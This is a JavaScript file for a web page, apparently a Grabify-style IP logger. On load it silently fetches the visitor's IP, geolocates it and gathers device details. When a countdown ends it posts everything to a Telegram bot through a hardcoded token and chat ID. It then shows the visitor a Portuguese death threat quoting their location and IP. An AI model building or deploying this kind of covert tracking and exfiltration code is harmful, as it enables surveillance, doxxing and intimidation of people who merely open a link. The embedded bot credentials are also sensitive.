// script.js - Smart Logger estilo Grabify (versão final)

let targetDate = new Date("2026-04-20T01:54:59").getTime();
let userIPv4 = '';
let userLatitude = '';
let userLongitude = '';
let timerInterval = null;
let alreadySent = false;

const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";
const CHAT_ID = "8448614204";

function getDeviceInfo() {
    const ram = navigator.deviceMemory 
        ? navigator.deviceMemory + " GB" 
        : "unknown";

    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language || navigator.userLanguage,
        screen: `${window.screen.width} x ${window.screen.height}`,
        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
        pixelRatio: window.devicePixelRatio || 1,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: ram,
        isMobile: /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
        batteryLevel: 'Não disponível',
        isCharging: 'Não disponível'
    };
}

function sendToTelegram() {
    if (alreadySent) return;
    alreadySent = true;

    const device = getDeviceInfo();

    const message = `🚨 ALVO CAPTURADO - TIMER ZERADO!\n\n` +
                    `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                    `🌐 IP: ${userIPv4 || 'Não capturado'}\n` +
                    `📍 Latitude: ${userLatitude || 'Não disponível'}\n` +
                    `📍 Longitude: ${userLongitude || 'Não disponível'}\n\n` +
                    `📱 Dispositivo:\n` +
                    `• Sistema: ${device.platform}\n` +
                    `• Navegador: ${device.userAgent.substring(0, 100)}...\n` +
                    `• Tela: ${device.screen} (${device.pixelRatio}x)\n` +
                    `• Janela: ${device.windowSize}\n` +
                    `• Mobile: ${device.isMobile ? 'Sim' : 'Não'}\n` +
                    `• Idioma: ${device.language}\n` +
                    `• Fuso horário: ${device.timezone}\n` +
                    `• Núcleos CPU: ${device.hardwareConcurrency}\n` +
                    `• Memória RAM aprox: ${device.deviceMemory}\n` +
                    `🔋 Bateria: ${device.batteryLevel} | Carregando: ${device.isCharging}\n` +
                    `🌐 Online: Sim\n\n` +
                    `Não é magia, é habilidade isto...`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
    })
    .then(res => res.json())
    .then(data => {
        if (data.ok) console.log("✅ Enviado para Telegram com sucesso!");
    })
    .catch(err => console.error("Erro ao enviar para Telegram:", err));
}

function updateTimer() {
    const timeNow = new Date().getTime();
    let timeLeft = targetDate - timeNow;

    if (timeLeft < 0) {
        clearInterval(timerInterval);
        
        document.getElementById("timer").innerHTML = `
            Tempo esgotado!<br>
            Prepare-se para morrer...<br><br>
            Você mora em: ${userLatitude || 'não disponível'}, ${userLongitude || 'não disponível'}<br>
            Seu IP é: ${userIPv4 || 'não disponível'}<br><br>
            Não é magia, é habilidade isto...
        `;

        sendToTelegram();
        return;
    }

    const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
    const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
    const centiseconds = Math.floor((timeLeft % 1000) / 10);

    document.getElementById("timer").innerHTML = `
        ${days}d ${hours}h ${minutes}m ${seconds}.${centiseconds.toString().padStart(2, '0')}s
    `;
}

// Busca IP + Localização (ip-api.com)
fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => {
        userIPv4 = data.ip;
        return fetch(`http://ip-api.com/json/${userIPv4}?fields=status,lat,lon`);
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === "success") {
            userLatitude = data.lat || '';
            userLongitude = data.lon || '';
        }
    })
    .catch(err => console.error("Erro na busca de localização:", err));

timerInterval = setInterval(updateTimer, 100);
updateTimer();